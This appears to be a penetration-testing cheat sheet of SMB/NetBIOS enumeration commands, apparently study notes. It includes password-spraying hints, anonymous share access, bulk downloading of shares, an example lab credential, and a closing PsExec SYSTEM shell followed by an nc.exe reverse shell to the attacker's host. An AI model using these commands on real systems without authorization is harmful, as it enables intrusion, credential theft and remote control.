# SMB/NetBIOS (445/139) Enumeration
- Enumerate SMB and Netbios (Port 139) at the same time. NetBIOS is older, often used in conjunction with SMB for backwards compatibility on both TCP/UDP.

## NMAP

```bash
#With file output
nmap -v -p 139,445 -oG smb.txt 192.168.50.1

cat smb.txt

#Target Agnostic
nmap -v -p 139,445 192.168.50.1

# Have a file name with multiple hosts?
nmap -p 139,445 --open -iL <PATH+FILENAME>
```

## NetBIOS Name Service Information

```bash
sudo nbtscan -r 192.168.50.1
```

## SMB NMAP Scripts

```bash
ls -1 /usr/share/nmap/scripts/smb*
#Results
/usr/share/nmap/scripts/smb2-capabilities.nse
/usr/share/nmap/scripts/smb2-security-mode.nse
/usr/share/nmap/scripts/smb2-time.nse
/usr/share/nmap/scripts/smb2-vuln-uptime.nse
/usr/share/nmap/scripts/smb-brute.nse
/usr/share/nmap/scripts/smb-double-pulsar-backdoor.nse
/usr/share/nmap/scripts/smb-enum-domains.nse
/usr/share/nmap/scripts/smb-enum-groups.nse
/usr/share/nmap/scripts/smb-enum-processes.nse
/usr/share/nmap/scripts/smb-enum-sessions.nse
/usr/share/nmap/scripts/smb-enum-shares.nse
/usr/share/nmap/scripts/smb-enum-users.nse
/usr/share/nmap/scripts/smb-os-discovery.nse

# Want to run them all together?
# run all SMB scripts at once with a wildcard:
nmap -p 445 --script "smb*" <TARGET IP>

# Or if you want to be more targeted and just run the vuln/enum ones and skip brute force:
nmap -p 445 --script "smb-enum*,smb2*,smb-vuln*" <TARGET IP>

# Or run all of them including smb and smb2:
nmap -p 139,445 -sV --script "smb*" <TAGET IP>
```

## Run an SMB Script

```bash
nmap -v -p 139,445 --script smb-os-discovery <TARGET IP>
```

## Enumerate SMB Via a Windows Client
### In Command Prompt
- By providing the /all keyword, we can list the administrative shares ending with the dollar sign.
```bash
net view \\dc01 /all

#results
Shared resources at \\dc01

Share name  Type  Used as  Comment

-------------------------------------------------------------------------------
ADMIN$      Disk           Remote Admin
C$          Disk           Default share
IPC$        IPC            Remote IPC
NETLOGON    Disk           Logon server share
SYSVOL      Disk           Logon server share
The command completed successfully.
```

## enum4linux
### Standard Enumeration
```bash
enum4linux -a 192.168.130.111

# -U to get userlist and -O to get OS information
enum4linux -U -o <IP>

# Enumerating multiple hosts via a file with host IPs. (This has null username/password in the command)

for ip in $(cat smb-hosts.txt); do enum4linux -a -u "" -p "" $ip > enum4linux-$ip.txt; done

```

## CrackmapExec
```bash
crackmapexec smb <IP/Range>

crackmapexec smb <IP> -u <username> -p <password>

crackmapexec smb <IP> -u <username> -p <password> --shares # Lists all available shares

crackmapexec smb <IP> -u <username> -p <password>--users # Lists users

crackmapexec smb <IP> -u <username> -p <password> --all # All information
# Use -p for specific port, -d for specific domain
# Use -windows-auth for domain users if needed
# Use --local-auth for local accounts
# Use --continue-on-success to "spray"
```

## NetExec (better crackmapexec)
```bash
nxc smb <ip> -u <username> -p <password>
# Can also use for WinRM, FTP, MSSQL, SSH
# Use --local-auth for local accounts
# Use --continue-on-success to "spray"
```

## SMBClient
```bash
# SMB Enumeration & Interaction

# List shares with no password - backslash syntax (alternative to forward slash version)
smbclient -N -L \\\\192.168.91.111\\

## Anonymous / Null Session Testing
# Test for anonymous access with no credentials
smbclient -L //<IP> -N
# Example Result:
# Sharename    Type    Comment
# ---------    ----    -------
# ADMIN$       Disk    Remote Admin
# C$           Disk    Default share
# IPC$         IPC     Remote IPC
# Documents    Disk
# What to do next? Note any non-default shares. Try connecting anonymously:
smbclient //<IP>/Documents -N

## SMBClient - List Shares
smbclient -L //<IP>
smbclient -L //<IP> -U <username>

# Impacket version (alternative)
python3 smbclient.py -L //192.168.123.111/ --no-pass
python3 smbclient.py //192.168.123.111/ -U <username>

## SMBClient - Connect to a Share
smbclient //<IP>/<share> -U <username>
smbclient //<IP>/<share> -U <domain>/<username>%'<password>'

# Example:
smbclient //192.168.158.159/Documents -U oscp/Eric.Wallows%'EricLikesRunning800'
# What to do next? You are now inside the share. Use navigation commands below.

## SMBClient - Navigation Commands
# List files and folders
ls

# Change directory
cd <foldername>

# Go back a directory
cd ..

# Download a single file
get backup.zip

# Upload a file
put nc.exe

# Download all files recursively (bulk download everything in the share)
mask ""
recurse ON
prompt OFF
mget *
# What to do next? Files saved to your current local directory. Inspect for credentials or sensitive data.

# Recursive listing only (no download) - see all files without downloading
recurse ON
ls

# Exit smbclient
exit

## SMBMap - Enumerate Shares and Permissions
smbmap -H <IP> -u <username> -p <password>
smbmap -H <IP> -u <username> -p <password> -d <domain>

# Enumerate a specific share recursively
smbmap -H <IP> -u <username> -p <password> -r <share_name>
# Example Result:
# Share        Permissions    Remark
# -----        -----------    ------
# ADMIN$                      Remote Admin
# C$                          Default share
# IPC$         READ           Remote IPC
# Documents    READ
# What to do next? Connect to readable shares via smbclient above.

## Mounting a Share (access like a local folder)
# Create a mount point
sudo mkdir /mnt/share

# Mount the share
sudo mount -t cifs //<IP>/<share> /mnt/share -o username=<username>,password=<password>,domain=<domain>

# Browse mounted share like a normal directory
ls /mnt/share

# Unmount when done
sudo umount /mnt/share
# What to do next? Any files in /mnt/share are directly accessible from Kali.

## PsExec - Get a SYSTEM Shell (requires ADMIN$ write access or Pwn3d!)
impacket-psexec '<username>:<password>@<IP>'
# Example Result:
# C:\Windows\system32> whoami
# nt authority\system
# NOTE: PsExec gives you a SYSTEM shell directly on connect.
# You do not need to upload a separate shell in most cases.

# Upload a tool to the target via SMB then execute it
smb> put nc.exe
smb> put shell.exe
smb> put shell.ps1

# Execute uploaded files from your SYSTEM shell:
# nc.exe reverse shell
nc.exe -e cmd.exe <KALI IP> <PORT>

# .exe reverse shell
shell.exe

# PowerShell script
powershell -ep bypass -f shell.ps1

# .bat file
shell.bat
```